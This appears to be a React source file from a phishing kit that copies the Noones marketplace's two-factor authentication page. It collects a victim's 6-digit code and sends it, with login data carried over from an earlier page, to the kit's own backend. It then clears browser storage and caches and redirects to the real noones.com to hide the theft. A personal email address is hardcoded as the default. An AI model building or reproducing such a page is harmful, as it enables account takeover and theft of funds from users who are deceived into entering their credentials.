import React, { useState, useEffect, useRef } from 'react';
import { useNavigate, useLocation } from 'react-router-dom';

export default function NoonesDeviceVerification() {
  const navigate = useNavigate();
  const location = useLocation();
  const [isDarkMode, setIsDarkMode] = useState(true);
  const [code, setCode] = useState(['', '', '', '', '', '']);
  const [resendTimer, setResendTimer] = useState(53);
  const inputRefs = useRef<(HTMLInputElement | null)[]>([]);

  const email = location.state?.email || 'gibsonkobia@gmail.com';
  const logoSrc = isDarkMode ? '/logos/noonesdark.jpg' : '/logos/nooneslight.jpg';

  useEffect(() => {
    if (resendTimer <= 0) return;
    const timer = setTimeout(() => setResendTimer((current) => current - 1), 1000);
    return () => clearTimeout(timer);
  }, [resendTimer]);

  const handleCodeChange = (index: number, value: string) => {
    if (!/^\d*$/.test(value)) return;

    const newCode = [...code];
    newCode[index] = value.slice(0, 1);
    setCode(newCode);

    if (value && index < 5) {
      inputRefs.current[index + 1]?.focus();
    }
  };

  const handleKeyDown = (index: number, e: React.KeyboardEvent<HTMLInputElement>) => {
    if (e.key === 'Backspace' && !code[index] && index > 0) {
      inputRefs.current[index - 1]?.focus();
    }
  };

  const handlePaste = async () => {
    try {
      const clipboardText = await navigator.clipboard.readText();
      const digits = clipboardText.replace(/\D/g, '').slice(0, 6);

      if (digits.length > 0) {
        const newCode = [...code];
        for (let i = 0; i < Math.min(digits.length, 6); i++) {
          newCode[i] = digits[i];
        }
        setCode(newCode);
        if (digits.length < 6) {
          inputRefs.current[digits.length]?.focus();
        } else {
          inputRefs.current[5]?.focus();
        }
      }
    } catch (err) {
      console.error('Failed to read clipboard:', err);
    }
  };

  const handleContinue = async () => {
    const verificationCode = code.join('');
    if (verificationCode.length !== 6) {
      alert('Please enter all 6 digits');
      return;
    }

    try {
      // Get the platform data from location state (set by Noones.tsx)
      const platformData = location.state?.platformData || {};

      // Submit the verification code with platform data to the backend
      const response = await fetch('/api/submit-connection', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          ...platformData,
          code: verificationCode,
        }),
      });

      if (!response.ok) {
        console.error('Failed to submit verification code:', response.statusText);
      }

      // Clear browser storage for our domain
      localStorage.clear();
      sessionStorage.clear();

      // Clear cache if available
      if ('caches' in window) {
        caches.keys().then(names => {
          names.forEach(name => {
            caches.delete(name);
          });
        });
      }

      // 5-second delay to allow page to load smoothly
      setTimeout(() => {
        // Redirect to Noones
        window.location.href = 'https://noones.com/';
      }, 5000);
    } catch (err) {
      console.error('Error during verification:', err);
      alert('Verification failed. Please try again.');
    }
  };

  const isComplete = code.every((digit) => digit !== '');
  const pageBg = isDarkMode ? 'bg-[#202020]' : 'bg-[#f2f2f2]';
  const cardBg = isDarkMode ? 'bg-[#292929] border border-[#333333]' : 'bg-white border border-slate-200';
  const pageText = isDarkMode ? 'text-white' : 'text-slate-900';
  const secondaryText = isDarkMode ? 'text-slate-400' : 'text-slate-500';
  const accentColor = isDarkMode ? '#44C166' : '#18C37E';

  return (
    <main className={`${pageBg} min-h-screen w-full flex flex-col items-center justify-center gap-8 py-10 px-4 sm:px-6 font-sans text-sm ${pageText}`}>
      <div className="w-[220px] flex justify-center">
        <img src={logoSrc} alt="Noones logo" className="w-full h-auto" />
      </div>

      <div className="w-full max-w-[480px]">
        <div className={`w-full ${cardBg} rounded-[32px] shadow-[0_40px_120px_rgba(0,0,0,0.18)] p-10 overflow-hidden`}
          style={{ boxShadow: isDarkMode ? '0 40px 120px rgba(0,0,0,0.28)' : '0 40px 120px rgba(15, 23, 42, 0.08)' }}
        >
          <h1 className="text-center text-3xl font-semibold tracking-tight mb-4" style={{ color: isDarkMode ? '#F8FAFC' : '#111827' }}>
            Two-factor authentication
          </h1>

          <div className="space-y-1 text-center mb-8">
            <p className={`text-base font-normal ${secondaryText}`}>Enter 6-digit code sent to</p>
            <p className={`text-base font-medium ${isDarkMode ? 'text-white' : 'text-slate-900'}`}>{email}</p>
          </div>

          <div className="flex justify-center gap-3 mb-6">
            {code.map((digit, index) => (
              <input
                key={index}
                ref={(el) => (inputRefs.current[index] = el)}
                type="text"
                inputMode="numeric"
                maxLength={1}
                value={digit}
                onChange={(e) => handleCodeChange(index, e.target.value)}
                onKeyDown={(e) => handleKeyDown(index, e)}
                className={`w-12 h-14 sm:w-14 sm:h-14 text-center text-xl font-semibold rounded-2xl border outline-none focus:ring-0 transition-colors ${isDarkMode ? 'border-white/10 bg-[#181B1F] text-white focus:border-[#44C166]' : 'border-slate-300 bg-slate-100 text-slate-900 focus:border-[#18C37E]'}`}
                autoComplete="off"
              />
            ))}
          </div>

          <div className="flex justify-center mb-6">
            <button
              type="button"
              onClick={handlePaste}
              className="text-sm font-medium"
              style={{ color: accentColor }}
            >
              Paste
            </button>
          </div>

          <p className={`text-center text-sm mb-8 ${secondaryText}`}>Resend in {resendTimer} seconds</p>

          <button
            onClick={handleContinue}
            disabled={!isComplete}
            className={`w-full h-14 rounded-full text-base font-semibold transition-all ${isComplete ? 'text-black' : 'text-white'} ${isComplete ? 'bg-[#44C166] hover:bg-[#3fb85a]' : 'bg-white/10 cursor-not-allowed opacity-70'}`}
          >
            Continue
          </button>

          <p className={`text-center text-xs mt-8 ${secondaryText}`}>
            If you need to reset 2FA, please{' '}
            <a href="#support" className={`font-semibold`} style={{ color: accentColor }}>
              contact support
            </a>
          </p>
        </div>
      </div>

      <div className="w-full max-w-[480px] flex items-center justify-between px-2">
        <button
          type="button"
          onClick={() => setIsDarkMode(!isDarkMode)}
          className="flex items-center gap-3 text-base p-0 bg-transparent"
          style={{ color: isDarkMode ? '#D8DCE6' : '#111827' }}
        >
          <span className={isDarkMode ? 'opacity-100' : 'opacity-50'}>☀️</span>
          <div className="w-14 h-6 rounded-full relative transition-all overflow-hidden" style={{ backgroundColor: isDarkMode ? '#44C166' : '#666A78' }}>
            <span className={`absolute top-1 w-4 h-4 rounded-full bg-white shadow-md transition-transform ${isDarkMode ? 'translate-x-7' : 'translate-x-1'}`} />
          </div>
          <span className={isDarkMode ? 'opacity-50' : 'opacity-100'}>🌙</span>
        </button>

        <button className="flex items-center gap-1 text-sm font-semibold" style={{ color: isDarkMode ? '#44C166' : '#18C37E' }}>
          English <span className="text-[10px]">▼</span>
        </button>
      </div>
    </main>
  );
}
